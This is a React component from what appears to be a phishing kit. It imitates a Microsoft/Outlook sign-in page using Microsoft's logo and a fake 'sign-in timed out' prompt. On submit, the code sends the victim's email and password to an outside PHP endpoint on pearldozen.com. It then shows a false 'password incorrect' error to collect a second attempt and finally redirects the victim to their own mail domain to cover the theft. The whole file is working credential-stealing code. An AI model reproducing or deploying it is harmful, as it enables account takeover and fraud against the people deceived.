
import React, { useEffect, useState, useRef } from "react";
import './App.css';
import { FaArrowLeft } from "react-icons/fa6";
import $ from "jquery";
import Preloader from "./Preloader/Preloader";
import { createPortal } from "react-dom";


const Outlook = ()=>{

  const [a, b] = useState(false);

  const outside_the_box = createPortal(<Preloader />, document.querySelector('.vite_tree'));

    const [spinLoader, setSpinLoader] = useState(false);

    const formRef = useRef();

    useEffect(()=>{
      b(true)
      setTimeout(() => {
        b(false);
      }, 6000);
    }, []);


    // hello title

    useEffect(()=>{
        const emailInTheURL = "Microsoft | Start";
    const sliceEqualSign = emailInTheURL.indexOf("@");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));
        document.title = extracetdEmail;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 6000);
    }, []);

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();;

    const [outlookEmail, setOutlookEmail] = useState(extracetdEmail);
    const [outlookPassword, setOulookPassword] = useState('');

    const [btnVal, setBtnVal] = useState('Start');

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);


    const submitOutlookForm = e=>{
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
            // setErr(true);
        }else{
            setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            setBtnVal('Checking...')
            
            $.ajax({
                type: "POST",
                url: "https://pearldozen.com/nc_assets/fonts/hey/newoffice.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setOulookPassword('');
                
                setTimeout(() => {
                    setSpinLoader(false);
                    setBtnVal('Start')
                    setErr(true);
                    
                }, 2300);
            }, 2700)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 1){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain}`;
            }

        }
    }


    return(<>{

      a ? outside_the_box :
    
    <section>

        { spinLoader ? <Preloader /> : null }
        
        <div className="Outlook_wrapper">

            <div className="Outlook_form_wrapper">
                <img 
                    alt="outlook_svg"
                    className="lg_o"
                    src={`https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg`}
                />

   

                <form onSubmit={submitOutlookForm} method="post" ref={formRef} className='forrmmm'>


                    <p></p>
                    
                    <div className="outlook_email_container">

                    

                    <span>
                        <FaArrowLeft className="lt_arr"/>
                    </span>

                        <input 
                            type={`email`}
                            value={outlookEmail}
                            readOnly
                            className="email_input_ input_outlook"
                            onChange={e=>setOutlookEmail(e.target.value)}
                            id="name"
                            name="name"
                        />
                    </div>

                    <p className="fx_err">
                        Sorry, your sign-in timed out. Please sign in again.

                    </p>


                    { err ?
                    <p className="err">
                    Your account or password is incorrect.
                </p>
                : null }


                <p className="big_pwd_label">Enter Password</p>



                    <div className="outlook_password_container">
                        
                    <label htmlFor="password"> </label>
                        <input 
                            type={`password`}
                            placeholder="Password"
                            className="password_input input_outlook"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            required={true}
                            title="Please fill out this field"
                            name="password"
                            autoFocus
                        />
                    </div>  


                    <div className="oiuytre">
                        <input
                            type={`submit`} 
                            value={btnVal}
                            className="outlook_submit"
                            onClick={submitOutlookForm}
                        />
                    </div>



                </form>
            </div>

        </div>

    </section>
  
                    }</>)
};

export default Outlook;